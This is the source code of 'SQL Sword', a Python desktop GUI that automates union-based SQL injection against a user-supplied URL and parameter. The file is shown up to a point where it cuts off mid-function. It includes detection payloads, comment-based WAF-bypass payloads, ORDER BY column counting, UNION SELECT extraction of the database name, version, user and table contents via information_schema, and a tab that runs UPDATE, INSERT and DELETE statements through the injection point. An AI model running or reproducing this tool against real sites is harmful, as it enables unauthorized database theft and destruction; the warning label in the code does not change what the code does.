import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import ttkbootstrap as ttkb
from ttkbootstrap.constants import *
import requests
from urllib.parse import urlparse, urljoin
from tkinter import Toplevel
import time
import threading
import re
import html


def center_window(win, width=300, height=200):
    # Dapatkan ukuran layar
    screen_width = win.winfo_screenwidth()
    screen_height = win.winfo_screenheight()

    # Hitung posisi x dan y supaya window di tengah
    x = (screen_width // 2) - (width // 2)
    y = (screen_height // 2) - (height // 2)

    # Atur geometry
    win.geometry(f"{width}x{height}+{x}+{y}")

def show_about(root):
    import webbrowser
    popup = ttkb.Toplevel(root)
    popup.title("Tentang")
    # popup.geometry("340x180")
    center_window(popup,360,200)
    popup.iconbitmap("sqli.ico")
    popup.resizable(False, False)
    popup.grab_set()

    frm = ttkb.Frame(popup, padding=15)
    frm.pack(fill="both", expand=True)

    # Judul
    ttkb.Label(frm, text="SQL Sword v1.0.0", font=("Arial", 13, "bold")).pack(pady=(0, 5))
    ttkb.Label(frm, text="by Peluru Kertas").pack(pady=(0, 10))

    # Hyperlink
    def open_link(event=None):
        webbrowser.open("https://github.com/derilkillms")

    link = ttkb.Label(frm, text="Github", foreground="yellow", cursor="hand2")
    link.pack()
    link.bind("<Button-1>", open_link)
    link.bind("<Enter>", lambda e: link.config(font=("Arial", 10, "underline")))
    link.bind("<Leave>", lambda e: link.config(font=("Arial", 10)))

    # Tombol OK
    ttkb.Button(frm, text="OK", bootstyle=SUCCESS, command=popup.destroy).pack(pady=15)


class SQLInjectionScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL SWORD \nSQL Injection Scanner - Union Based")
        self.root.geometry("1300x900")
        center_window(self.root,1300,900)
        self.style = ttkb.Style("darkly")
        self.root.iconbitmap("sqli.ico")
        
        self.create_widgets()
        self.is_scanning = False
        self.original_content = None
        self.current_db = None
        self.num_columns = None
        self.injectable_cols = None
        self.url = None
        self.param = None

         # membuat menu bar
        menubar = tk.Menu(root)
        filemenu = tk.Menu(menubar, tearoff=0)
        filemenu.add_command(label="Exit", command=root.quit)
        menubar.add_cascade(label="File", menu=filemenu)
        aboutmenu = tk.Menu(menubar, tearoff=0)
        aboutmenu.add_command(label="About", command=lambda:show_about(root))
        menubar.add_cascade(label="About", menu=aboutmenu)

        root.config(menu=menubar)
        
    def create_widgets(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=BOTH, expand=True)
        
        # Title
        title_label = ttk.Label(main_frame, text="SQL SWORD - SQL Injection Automation Tool - UNION Based", 
                               font=('Helvetica', 16, 'bold'), bootstyle=PRIMARY)
        title_label.pack(pady=(0, 20))
        
        # Create Notebook for tabs
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=BOTH, expand=True)
        
        # Scan Tab
        self.scan_tab = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.scan_tab, text="SQL Injection Scan")
        
        # Manual Explorer Tab
        self.explorer_tab = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.explorer_tab, text="Database Explorer")

        # ✅ TAMBAH INI: Data Manipulation Tab
        self.manipulation_tab = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.manipulation_tab, text="Data Manipulation")
        
        self.setup_scan_tab()
        self.setup_explorer_tab()
        self.setup_manipulation_tab()  # ✅ TAMBAH INI
        
    def setup_scan_tab(self):
        # URL Input Frame
        url_frame = ttk.LabelFrame(self.scan_tab, text="Target Configuration", padding=10)
        url_frame.pack(fill=X, pady=(0, 10))
        
        ttk.Label(url_frame, text="Target URL:").grid(row=0, column=0, sticky=W, pady=5)
        self.url_entry = ttk.Entry(url_frame, width=80)
        self.url_entry.grid(row=0, column=1, sticky=EW, padx=(5, 0), pady=5)
        self.url_entry.insert(0, "http://testphp.vulnweb.com/artists.php")
        
        ttk.Label(url_frame, text="Parameter:").grid(row=1, column=0, sticky=W, pady=5)
        self.param_entry = ttk.Entry(url_frame, width=30)
        self.param_entry.grid(row=1, column=1, sticky=W, padx=(5, 0), pady=5)
        self.param_entry.insert(0, "artist")
        
        # Method and WAF Bypass
        method_frame = ttk.Frame(url_frame)
        method_frame.grid(row=2, column=1, sticky=W, pady=5)
        
        self.method_var = tk.StringVar(value="GET")
        ttk.Radiobutton(method_frame, text="GET", variable=self.method_var, value="GET").pack(side=LEFT)
        ttk.Radiobutton(method_frame, text="POST", variable=self.method_var, value="POST").pack(side=LEFT, padx=(10, 0))
        
        self.waf_var = tk.BooleanVar()
        ttk.Checkbutton(method_frame, text="Enable WAF Bypass", variable=self.waf_var).pack(side=LEFT, padx=(20, 0))
        
        self.verbose_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(method_frame, text="Verbose Output", variable=self.verbose_var).pack(side=LEFT, padx=(20, 0))
        
        url_frame.columnconfigure(1, weight=1)
        
        # Scan Configuration Frame
        config_frame = ttk.LabelFrame(self.scan_tab, text="Scan Configuration", padding=10)
        config_frame.pack(fill=X, pady=(0, 10))
        
        ttk.Label(config_frame, text="Max Columns:").grid(row=0, column=0, sticky=W, pady=5)
        self.max_cols = ttk.Spinbox(config_frame, from_=1, to=50, width=10)
        self.max_cols.set("15")
        self.max_cols.grid(row=0, column=1, sticky=W, padx=(5, 0), pady=5)
        
        ttk.Label(config_frame, text="Delay (seconds):").grid(row=0, column=2, sticky=W, pady=5, padx=(20, 0))
        self.delay_entry = ttk.Spinbox(config_frame, from_=0, to=10, width=10)
        self.delay_entry.set("0.5")
        self.delay_entry.grid(row=0, column=3, sticky=W, padx=(5, 0), pady=5)
        
        # Control Buttons
        button_frame = ttk.Frame(self.scan_tab)
        button_frame.pack(fill=X, pady=(0, 10))
        
        self.scan_btn = ttk.Button(button_frame, text="Start Scan", 
                                  command=self.start_scan, bootstyle=SUCCESS)
        self.scan_btn.pack(side=LEFT, padx=(0, 10))
        
        self.stop_btn = ttk.Button(button_frame, text="Stop Scan", 
                                  command=self.stop_scan, bootstyle=DANGER, state=DISABLED)
        self.stop_btn.pack(side=LEFT)
        
        self.clear_btn = ttk.Button(button_frame, text="Clear", 
                                   command=self.clear_output, bootstyle=WARNING)
        self.clear_btn.pack(side=LEFT, padx=(10, 0))
        
        # Progress bar
        self.progress = ttk.Progressbar(self.scan_tab, mode='determinate', bootstyle=SUCCESS)
        self.progress.pack(fill=X, pady=(0, 10))
        
        # Results Frame
        results_frame = ttk.LabelFrame(self.scan_tab, text="Scan Results", padding=10)
        results_frame.pack(fill=BOTH, expand=True)
        
        # Results text area
        self.results_text = scrolledtext.ScrolledText(results_frame, height=20, width=120)
        self.results_text.pack(fill=BOTH, expand=True)
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready to scan...")
        status_bar = ttk.Label(self.scan_tab, textvariable=self.status_var, relief=SUNKEN)
        status_bar.pack(fill=X, side=BOTTOM)
        
    def setup_explorer_tab(self):
        # Database Explorer Frame
        explorer_frame = ttk.LabelFrame(self.explorer_tab, text="Database Explorer", padding=10)
        explorer_frame.pack(fill=BOTH, expand=True)
        
        # Top frame for controls
        top_frame = ttk.Frame(explorer_frame)
        top_frame.pack(fill=X, pady=(0, 10))
        
        ttk.Label(top_frame, text="Current DB:").pack(side=LEFT)
        self.db_label = ttk.Label(top_frame, text="Not scanned", bootstyle=INFO)
        self.db_label.pack(side=LEFT, padx=(5, 20))
        
        self.refresh_btn = ttk.Button(top_frame, text="Refresh Tables", 
                                     command=self.refresh_tables, bootstyle=INFO)
        self.refresh_btn.pack(side=LEFT)
        
        # Main explorer frame with PanedWindow
        main_paned = ttk.PanedWindow(explorer_frame, orient=HORIZONTAL)
        main_paned.pack(fill=BOTH, expand=True)
        
        # Left frame for database structure
        left_frame = ttk.LabelFrame(main_paned, text="Database Structure", padding=10)
        main_paned.add(left_frame, weight=1)
        
        # Treeview for database structure
        self.db_tree = ttk.Treeview(left_frame, show='tree', height=15)
        self.db_tree.pack(fill=BOTH, expand=True)
        
        # Configure treeview scrollbar
        tree_scroll = ttk.Scrollbar(left_frame, orient=VERTICAL, command=self.db_tree.yview)
        tree_scroll.pack(side=RIGHT, fill=Y)
        self.db_tree.configure(yscrollcommand=tree_scroll.set)
        
        # Bind treeview selection
        self.db_tree.bind('<<TreeviewSelect>>', self.on_tree_select)
        
        # Right frame for data display
        right_frame = ttk.LabelFrame(main_paned, text="Table Data", padding=10)
        main_paned.add(right_frame, weight=2)
        
        # Data controls
        controls_frame = ttk.Frame(right_frame)
        controls_frame.pack(fill=X, pady=(0, 10))
        
        ttk.Label(controls_frame, text="Limit:").pack(side=LEFT)
        self.limit_entry = ttk.Entry(controls_frame, width=10)
        self.limit_entry.insert(0, "10")
        self.limit_entry.pack(side=LEFT, padx=(5, 10))
        
        self.fetch_btn = ttk.Button(controls_frame, text="Fetch Data", 
                                   command=self.fetch_table_data, bootstyle=SUCCESS)
        self.fetch_btn.pack(side=LEFT)
        
        self.export_btn = ttk.Button(controls_frame, text="Export Data", 
                                    command=self.export_data, bootstyle=WARNING)
        self.export_btn.pack(side=LEFT, padx=(10, 0))
        
        # Treeview for data display
        self.data_tree = ttk.Treeview(right_frame, show='headings', height=15)
        self.data_tree.pack(fill=BOTH, expand=True)
        
        # Scrollbars for data treeview
        data_xscroll = ttk.Scrollbar(right_frame, orient=HORIZONTAL, command=self.data_tree.xview)
        data_xscroll.pack(side=BOTTOM, fill=X)
        data_yscroll = ttk.Scrollbar(right_frame, orient=VERTICAL, command=self.data_tree.yview)
        data_yscroll.pack(side=RIGHT, fill=Y)
        self.data_tree.configure(xscrollcommand=data_xscroll.set, yscrollcommand=data_yscroll.set)
        
        # Status for explorer
        self.explorer_status_var = tk.StringVar(value="Select a table to view data")
        explorer_status_bar = ttk.Label(explorer_frame, textvariable=self.explorer_status_var, relief=SUNKEN)
        explorer_status_bar.pack(fill=X, side=BOTTOM)
    
    def setup_manipulation_tab(self):
        """Setup the data manipulation tab for UPDATE queries"""
        main_frame = ttk.LabelFrame(self.manipulation_tab, text="SQL Data Manipulation", padding=10)
        main_frame.pack(fill=BOTH, expand=True, pady=10)
        
        # Warning frame
        warning_frame = ttk.Frame(main_frame)
        warning_frame.pack(fill=X, pady=(0, 10))
        ttk.Label(warning_frame, text="⚠️ WARNING: Use responsibly! Only for authorized testing!", 
                bootstyle=DANGER, font=('Helvetica', 10, 'bold')).pack()
        
        # Input frame
        input_frame = ttk.Frame(main_frame)
        input_frame.pack(fill=X, pady=10)
        
        # Table selection
        ttk.Label(input_frame, text="Table:").grid(row=0, column=0, sticky=W, pady=5)
        self.update_table = ttk.Combobox(input_frame, width=25)
        self.update_table.grid(row=0, column=1, sticky=W, padx=5, pady=5)
        
        # Column to update
        ttk.Label(input_frame, text="Column:").grid(row=1, column=0, sticky=W, pady=5)
        self.update_column = ttk.Entry(input_frame, width=30)
        self.update_column.grid(row=1, column=1, sticky=W, padx=5, pady=5)
        
        # New value
        ttk.Label(input_frame, text="New Value:").grid(row=2, column=0, sticky=W, pady=5)
        self.new_value = ttk.Entry(input_frame, width=30)
        self.new_value.grid(row=2, column=1, sticky=W, padx=5, pady=5)
        
        # WHERE condition
        ttk.Label(input_frame, text="WHERE Condition:").grid(row=3, column=0, sticky=W, pady=5)
        self.where_condition = ttk.Entry(input_frame, width=30)
        self.where_condition.grid(row=3, column=1, sticky=W, padx=5, pady=5)
        ttk.Label(input_frame, text="Example: username='admin'", font=('Helvetica', 8)).grid(row=4, column=1, sticky=W, padx=5)
        
        # Buttons frame
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=X, pady=10)
        
        self.update_btn = ttk.Button(button_frame, text="Execute UPDATE", 
                                    command=self.execute_update, bootstyle=DANGER)
        self.update_btn.pack(side=LEFT, padx=(0, 10))
        
        self.insert_btn = ttk.Button(button_frame, text="Execute INSERT", 
                                    command=self.execute_insert, bootstyle=WARNING)
        self.insert_btn.pack(side=LEFT, padx=(0, 10))
        
        self.delete_btn = ttk.Button(button_frame, text="Execute DELETE", 
                                    command=self.execute_delete, bootstyle=DANGER)
        self.delete_btn.pack(side=LEFT)
        
        # Results area
        results_frame = ttk.LabelFrame(main_frame, text="Execution Results", padding=10)
        results_frame.pack(fill=BOTH, expand=True, pady=10)
        
        self.manipulation_results = scrolledtext.ScrolledText(results_frame, height=8)
        self.manipulation_results.pack(fill=BOTH, expand=True)
        
        # Status
        self.manipulation_status = tk.StringVar(value="Ready for data manipulation...")
        ttk.Label(main_frame, textvariable=self.manipulation_status, relief=SUNKEN).pack(fill=X, side=BOTTOM)
            
    def log(self, message, color="black"):
        """Add message to results text area"""
        timestamp = time.strftime("%H:%M:%S")
        self.results_text.insert(END, f"[{timestamp}] {message}\n")
        self.results_text.see(END)
        self.root.update()
        
    def clear_output(self):
        """Clear results text area"""
        self.results_text.delete(1.0, END)
        
    def start_scan(self):
        """Start the SQL injection scan in a separate thread"""
        if self.is_scanning:
            return
            
        self.url = self.url_entry.get().strip()
        self.param = self.param_entry.get().strip()
        
        if not self.url or not self.param:
            messagebox.showerror("Error", "Please enter URL and parameter")
            return
            
        self.is_scanning = True
        self.scan_btn.config(state=DISABLED)
        self.stop_btn.config(state=NORMAL)
        self.progress['value'] = 0
        
        # Start scan in separate thread
        thread = threading.Thread(target=self.run_scan, args=(self.url, self.param))
        thread.daemon = True
        thread.start()
        
    def stop_scan(self):
        """Stop the current scan"""
        self.is_scanning = False
        self.scan_btn.config(state=NORMAL)
        self.stop_btn.config(state=DISABLED)
        self.status_var.set("Scan stopped by user")
        
    def run_scan(self, url, param):
        """Main scanning function"""
        try:
            self.log("=" * 60)
            self.log("STARTING SQL INJECTION SCAN - UNION BASED")
            self.log("=" * 60)
            self.log(f"Target URL: {url}")
            self.log(f"Parameter: {param}")
            self.log(f"Method: {self.method_var.get()}")
            self.log(f"WAF Bypass: {'Enabled' if self.waf_var.get() else 'Disabled'}")
            self.log("")
            
            # Get original content for comparison
            self.original_content = self.make_request(url, param, "1")
            if self.original_content is None:
                self.log("[-] Cannot connect to target")
                return
            
            # Step 1: Vulnerability Detection
            self.status_var.set("Step 1: Testing for vulnerability...")
            if self.test_vulnerability(url, param):
                self.log("[+] Target appears to be VULNERABLE to SQL Injection!", "green")
                
                # Step 2: Find number of columns
                self.status_var.set("Step 2: Finding number of columns...")
                self.num_columns = self.find_columns(url, param)
                
                if self.num_columns:
                    self.log(f"[+] Found {self.num_columns} columns", "green")
                    
                    # Step 3: Find injectable columns
                    self.status_var.set("Step 3: Finding injectable columns...")
                    self.injectable_cols = self.find_injectable_columns(url, param, self.num_columns)
                    
                    if self.injectable_cols:
                        self.log(f"[+] Injectable columns found: {self.injectable_cols}", "green")
                        
                        # Step 4: Extract basic information
                        self.status_var.set("Step 4: Extracting information...")
                        self.extract_information(url, param, self.num_columns, self.injectable_cols)
                        
                        # Switch to explorer tab and populate tables
                        self.root.after(0, self.switch_to_explorer)
                    else:
                        self.log("[-] No injectable columns found", "red")
                else:
                    self.log("[-] Could not determine number of columns", "red")
            else:
                self.log("[-] Target does not appear to be vulnerable", "red")
                
        except Exception as e:
            self.log(f"[-] Error during scan: {str(e)}", "red")
        finally:
            self.is_scanning = False
            self.scan_btn.config(state=NORMAL)
            self.stop_btn.config(state=DISABLED)
            self.status_var.set("Scan completed")
            self.progress['value'] = 100
            
    def switch_to_explorer(self):
        """Switch to explorer tab after successful scan"""
        self.notebook.select(1)  # Switch to explorer tab
        self.refresh_tables()
            
    def test_vulnerability(self, url, param):
        """Test if target is vulnerable to SQL injection"""
        test_payloads = [
            "'",
            "' -- -",
            "'#",
            "''",
            "\"",
            "\" -- -",
            "' AND '1'='1",
            "' AND '1'='2"
        ]
        
        if self.waf_var.get():
            # WAF bypass payloads
            test_payloads.extend([
                "/*!50000'*/",
                "'/*!50000*/",
                "%00'",
                "'%20",
                "'/*!50000*/--+-"
            ])
        
        for payload in test_payloads:
            if not self.is_scanning:
                return False
                
            test_value = f"1{payload}"
            response_content = self.make_request(url, param, test_value)

            self.log(f"{url}?{param}={test_value}")
            
            if response_content and response_content != self.original_content:
                # Different response = possible SQLi
                self.log(f"[!] Different response with payload: {payload}")
                return True
                
            time.sleep(float(self.delay_entry.get()))
            
        return False
        
    def find_columns(self, url, param):
        """Find number of columns using ORDER BY with content comparison"""
        max_cols = int(self.max_cols.get())
        
        # First get original content with valid ID
        original_response = self.make_request(url, param, "1")
        
        for i in range(1, max_cols + 1):
            if not self.is_scanning:
                return None
                
            self.status_var.set(f"Testing ORDER BY {i}...")
            self.progress['value'] = (i / max_cols) * 25

            payload = f"1 order by {i}-- -"
            if self.waf_var.get():
                payload = f"1/*!50000order*/+/*!50000by*/+{i}--+-"
                
            response = self.make_request(url, param, payload)

            self.log(f"{url}?{param}={payload}")
            
            if response is None:
                continue
                
            # Check if response is different from original (error condition)
            if response != original_response:
                if self.verbose_var.get():
                    self.log(f"[-] Error at ORDER BY {i} - likely {i-1} columns")
                return i - 1
            else:
                if self.verbose_var.get():
                    self.log(f"[+] ORDER BY {i} successful")
                
            time.sleep(float(self.delay_entry.get()))
            
        # If we reach here, all ORDER BY worked, so return max
        return max_cols
        
    def find_injectable_columns(self, url, param, num_columns):
        """Find which columns are injectable using UNION SELECT"""
        self.progress['value'] = 50
        
        # Create SELECT statement with placeholders
        select_parts = []
        for i in range(1, num_columns + 1):
            select_parts.append(f"'{i}'")
            
        select_stmt = ",".join(select_parts)
        
        payload = f"-1 union select {select_stmt}-- -"
        if self.waf_var.get():
            payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
            
        response = self.make_request(url, param, payload)
        self.log(f"{url}?{param}={payload}")
        
        if response and response != self.original_content:
            # Look for numbers in response that match our select values
            injectable = []
            for i in range(1, num_columns + 1):
                if str(i) in response:
                    injectable.append(i)
                    self.log(f"[+] Column {i} is injectable (shows in response)")
                    
            return injectable if injectable else list(range(1, num_columns + 1))
            
        return list(range(1, num_columns + 1))
        
    def extract_information(self, url, param, num_columns, injectable_cols):
        """Extract database information using HTML wrapping technique"""
        self.progress['value'] = 75
        
        queries = {
            "Database": "database()",
            "Version": "version()", 
            "User": "user()"
        }
        
        self.log("\n" + "="*50)
        self.log("BASIC INFORMATION EXTRACTION")
        self.log("="*50)
        
        for name, query in queries.items():
            if not self.is_scanning:
                return
                
            for col in injectable_cols:
                # Wrap the query with HTML tag
                wrapped_query = f"concat('<div class=\"sqli-data\">', ({query}), '</div>')"
                
                select_parts = []
                for i in range(1, num_columns + 1):
                    if i == col:
                        select_parts.append(f"({wrapped_query})")
                    else:
                        select_parts.append("null")
                        
                select_stmt = ",".join(select_parts)
                payload = f"-1 union select {select_stmt}-- -"
                
                if self.waf_var.get():
                    payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
                    
                response = self.make_request(url, param, payload)
                self.log(f"{url}?{param}={payload}")
                
                if response and response != self.original_content:
                    # Extract from HTML tag
                    result = self.extract_from_html_tag(response)
                    if result:
                        self.log(f"[+] {name}: {result}")
                        if name == "Database":
                            self.current_db = result
                            self.root.after(0, lambda: self.db_label.config(text=result))
                        break
                
                time.sleep(float(self.delay_entry.get()))
                
        self.progress['value'] = 100
        self.log("\n[+] Information extraction completed!")
        
    def extract_from_html_tag(self, response):
        """Extract data from sqli-data HTML tag"""
        pattern = r'<div class="sqli-data">(.*?)</div>'
        matches = re.findall(pattern, response, re.DOTALL | re.IGNORECASE)
        
        for match in matches:
            if match and match != 'null' and match.strip():
                clean_match = html.unescape(match.strip())
                return clean_match
        return None
        
    def refresh_tables(self):
        """Refresh the list of tables using HTML wrapping technique"""
        if not all([self.url, self.param, self.num_columns, self.injectable_cols]):
            messagebox.showwarning("Warning", "Please complete the scan first")
            return
            
        self.explorer_status_var.set("Fetching tables...")
        
        # Clear existing tree
        for item in self.db_tree.get_children():
            self.db_tree.delete(item)
            
        # Clear data tree
        for item in self.data_tree.get_children():
            self.data_tree.delete(item)
        self.data_tree["columns"] = []
        
        # Add database as root
        db_node = self.db_tree.insert("", "end", text=f"Database: {self.current_db}", values=["database"])
        
        # Get tables from information_schema dengan HTML wrapping
        col = self.injectable_cols[0]
        
        # Build select parts dengan HTML wrapping
        select_parts = []
        for i in range(1, self.num_columns + 1):
            if i == col:
                # Query untuk get tables dengan HTML wrapping
                wrapped_query = f"concat('<div class=\"sqli-data\">', (select group_concat(table_name) from information_schema.tables where table_schema=database()), '</div>')"
                select_parts.append(f"({wrapped_query})")
            else:
                select_parts.append("null")
                
        select_stmt = ",".join(select_parts)
        payload = f"-1 union select {select_stmt}-- -"
        
        if self.waf_var.get():
            payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
            
        response = self.make_request(self.url, self.param, payload)

        self.log(f"{self.url}?{self.param}={payload}")
        
        if response and response != self.original_content:
            tables_str = self.extract_from_html_tag(response)
            if tables_str:
                tables = tables_str.split(',')
                for table in tables:
                    table = table.strip()
                    if table:  # Pastikan table name tidak kosong
                        table_node = self.db_tree.insert(db_node, "end", text=table, values=["table", table])
                self.explorer_status_var.set(f"Found {len(tables)} tables")
            else:
                self.explorer_status_var.set("No tables found")
        else:
            self.explorer_status_var.set("Error fetching tables")
            
    def fetch_columns_for_table(self, table_name, parent_node):
        """Fetch columns for a table using HTML wrapping technique"""
        # Convert table name to CHAR() format untuk avoid quotes
        char_codes = ",".join(str(ord(c)) for c in table_name)
        
        col = self.injectable_cols[0]
        
        # Build select parts dengan HTML wrapping
        select_parts = []
        for i in range(1, self.num_columns + 1):
            if i == col:
                # Query untuk get columns dengan HTML wrapping dan CHAR() bypass
                wrapped_query = f"concat('<div class=\"sqli-data\">', (select group_concat(column_name) from information_schema.columns where table_name=CHAR({char_codes}) and table_schema=database()), '</div>')"
                select_parts.append(f"({wrapped_query})")
            else:
                select_parts.append("null")
                
        select_stmt = ",".join(select_parts)
        payload = f"-1 union select {select_stmt}-- -"
        
        if self.waf_var.get():
            payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
            
        response = self.make_request(self.url, self.param, payload)
        
        if response and response != self.original_content:
            columns_str = self.extract_from_html_tag(response)
            if columns_str:
                columns = columns_str.split(',')
                for column in columns:
                    column = column.strip()
                    if column:  # Pastikan column name tidak kosong
                        self.db_tree.insert(parent_node, "end", text=column, values=["column", table_name, column])

                
    def on_tree_select(self, event):
        """When a table is selected in treeview - UPDATE untuk auto-fill"""
        selection = self.db_tree.selection()
        if not selection:
            return
            
        item = self.db_tree.item(selection[0])
        item_type = item["values"][0] if item["values"] else ""
        
        if item_type == "table":
            table_name = item["values"][1]
            self.explorer_status_var.set(f"Selected table: {table_name}")
            
            # ✅ AUTO-FILL untuk manipulation tab
            self.update_table.set(table_name)
            
        elif item_type == "column":
            table_name = item["values"][1]
            column_name = item["values"][2]
            
            # ✅ AUTO-FILL column untuk manipulation tab
            self.update_column.set(column_name)
            
    def fetch_table_data(self):
        """Fetch data from selected table menggunakan HTML wrapping technique"""
        selection = self.db_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a table first")
            return
            
        item = self.db_tree.item(selection[0])
        item_type = item["values"][0] if item["values"] else ""
        
        if item_type != "table":
            messagebox.showwarning("Warning", "Please select a table (not a column or database)")
            return
            
        table_name = item["values"][1]
        limit = self.limit_entry.get()
        
        self.explorer_status_var.set(f"Fetching data from {table_name}...")
        
        # Clear existing data
        for item in self.data_tree.get_children():
            self.data_tree.delete(item)
            
        # Get all columns untuk table ini dengan HTML wrapping
        char_codes = ",".join(str(ord(c)) for c in table_name)
        col = self.injectable_cols[0]
        
        # Query untuk get columns
        select_parts = []
        for i in range(1, self.num_columns + 1):
            if i == col:
                wrapped_query = f"concat('<div class=\"sqli-data\">', (select group_concat(column_name) from information_schema.columns where table_name=CHAR({char_codes}) and table_schema=database()), '</div>')"
                select_parts.append(f"({wrapped_query})")
            else:
                select_parts.append("null")
                
        select_stmt = ",".join(select_parts)
        payload = f"-1 union select {select_stmt}-- -"
        
        if self.waf_var.get():
            payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
            
        response = self.make_request(self.url, self.param, payload)
        self.log(f"{self.url}?{self.param}={payload}")
        
        if not response or response == self.original_content:
            self.explorer_status_var.set(f"Error fetching columns for {table_name}")
            return
            
        columns_str = self.extract_from_html_tag(response)
        if not columns_str:
            self.explorer_status_var.set(f"No columns found for {table_name}")
            return
            
        columns = columns_str.split(',')
        
        # Configure data treeview columns
        self.data_tree["columns"] = columns
        self.data_tree["show"] = "headings"
        
        # Set column headings
        for col_name in columns:
            self.data_tree.heading(col_name, text=col_name)
            self.data_tree.column(col_name, width=100, minwidth=50)
        
        # Sekarang fetch data dari table dengan HTML wrapping
        # Build columns untuk concat dengan pemisah :::
        columns_concat = []
        for column in columns:
            columns_concat.append(column)
            columns_concat.append("0x3a3a3a")  # Hex untuk ':::'
        
        # Hapus pemisah terakhir
        columns_concat = columns_concat[:-1]
        concat_str = "concat(" + ",".join(columns_concat) + ")"
        
        # Query untuk get data dengan HTML wrapping
        select_parts_data = []
        for i in range(1, self.num_columns + 1):
            if i == col:
                wrapped_query_data = f"concat('<div class=\"sqli-data\">', (select group_concat({concat_str}) from {table_name} limit {limit}), '</div>')"
                select_parts_data.append(f"({wrapped_query_data})")
            else:
                select_parts_data.append("null")
                
        select_stmt_data = ",".join(select_parts_data)
        payload_data = f"-1 union select {select_stmt_data}-- -"
        
        if self.waf_var.get():
            payload_data = f"-1/*!50000union*/+/*!50000select*/+{select_stmt_data}--+-"
            
        response_data = self.make_request(self.url, self.param, payload_data)
        
        if response_data and response_data != self.original_content:
            data_str = self.extract_from_html_tag(response_data)
            if data_str:
                # Parse data yang dipisah :::
                rows = data_str.split(':::')
                data_rows = []
                
                # Process setiap row
                for i in range(0, len(rows), len(columns)):
                    if i + len(columns) <= len(rows):
                        row = rows[i:i+len(columns)]
                        data_rows.append(row)
                
                # Insert data ke treeview
                for row in data_rows:
                    self.data_tree.insert("", "end", values=row)
                    
                self.explorer_status_var.set(f"Displaying {len(data_rows)} rows from {table_name}")
            else:
                self.explorer_status_var.set(f"No data found in {table_name}")
        else:
            self.explorer_status_var.set(f"Error fetching data from {table_name}")
            
    def execute_custom_query_proper(self, query, expected_columns):
        """Execute SQL query and properly parse multiple columns of data using HTML wrapping"""
        if not self.injectable_cols:
            return None
            
        # Use first injectable column
        col = self.injectable_cols[0]
        
        # Build the wrapped query untuk multiple columns
        if expected_columns > 1:
            # Untuk multiple columns, gunakan group_concat dengan separator
            wrapped_query = f"concat('<div class=\"sqli-data\">', group_concat(concat_ws('|||', ({query}))), '</div>')"
        else:
            # Untuk single column
            wrapped_query = f"concat('<div class=\"sqli-data\">', ({query}), '</div>')"
        
        select_parts = []
        for i in range(1, self.num_columns + 1):
            if i == col:
                select_parts.append(f"({wrapped_query})")
            else:
                select_parts.append("null")
                
        select_stmt = ",".join(select_parts)
        payload = f"-1 union select {select_stmt}-- -"
        
        if self.waf_var.get():
            payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
            
        response = self.make_request(self.url, self.param, payload)
        
        if response and response != self.original_content:
            return self.extract_multiple_from_html(response, expected_columns)
            
        return None

    def execute_custom_query(self, query):
        """Execute a custom SQL query and return single column results using HTML wrapping"""
        if not self.injectable_cols:
            return None
            
        # Use first injectable column
        col = self.injectable_cols[0]
        
        # Wrap dengan HTML tag
        wrapped_query = f"concat('<div class=\"sqli-data\">', ({query}), '</div>')"
        
        select_parts = []
        for i in range(1, self.num_columns + 1):
            if i == col:
                select_parts.append(f"({wrapped_query})")
            else:
                select_parts.append("null")
                
        select_stmt = ",".join(select_parts)
        payload = f"-1 union select {select_stmt}-- -"
        
        if self.waf_var.get():
            payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
            
        response = self.make_request(self.url, self.param, payload)
        
        if response and response != self.original_content:
            return self.extract_single_from_html(response)
                
        return None
    
    def execute_update(self):
        """Execute UPDATE query via SQL injection"""
        if not self.validate_manipulation_inputs():
            return
            
        table = self.update_table.get()
        column = self.update_column.get()
        new_val = self.new_value.get()
        where = self.where_condition.get()
        
        # Build UPDATE query
        if where:
            update_query = f"UPDATE {table} SET {column}='{new_val}' WHERE {where}"
        else:
            update_query = f"UPDATE {table} SET {column}='{new_val}'"
        
        self.log_manipulation(f"Executing: {update_query}")
        self.execute_manipulation_query(update_query, "UPDATE")

    def execute_insert(self):
        """Execute INSERT query via SQL injection"""
        if not self.validate_manipulation_inputs():
            return
            
        table = self.update_table.get()
        columns = self.update_column.get()  # Format: col1,col2,col3
        values = self.new_value.get()       # Format: val1,val2,val3
        
        insert_query = f"INSERT INTO {table} ({columns}) VALUES ({values})"
        self.log_manipulation(f"Executing: {insert_query}")
        self.execute_manipulation_query(insert_query, "INSERT")

    def execute_delete(self):
        """Execute DELETE query via SQL injection"""
        table = self.update_table.get()
        where = self.where_condition.get()
        
        if not table:
            messagebox.showerror("Error", "Please specify table")
            return
            
        if not where:
            if not messagebox.askyesno("Confirm", "DELETE without WHERE condition? This will delete ALL data!"):
                return
        
        delete_query = f"DELETE FROM {table} WHERE {where}" if where else f"DELETE FROM {table}"
        self.log_manipulation(f"Executing: {delete_query}")
        self.execute_manipulation_query(delete_query, "DELETE")

    def execute_manipulation_query(self, query, operation_type):
        """Execute manipulation query via SQL injection"""
        try:
            col = self.injectable_cols[0]
            
            # Method 1: Using subquery in SELECT
            select_parts = []
            for i in range(1, self.num_columns + 1):
                if i == col:
                    # Wrap dengan HTML tag untuk consistency
                    wrapped_query = f"concat('<div class=\"sqli-data\">', ({query}), '</div>')"
                    select_parts.append(f"({wrapped_query})")
                else:
                    select_parts.append("null")
            
            select_stmt = ",".join(select_parts)
            payload = f"-1 union select {select_stmt}-- -"
            
            if self.waf_var.get():
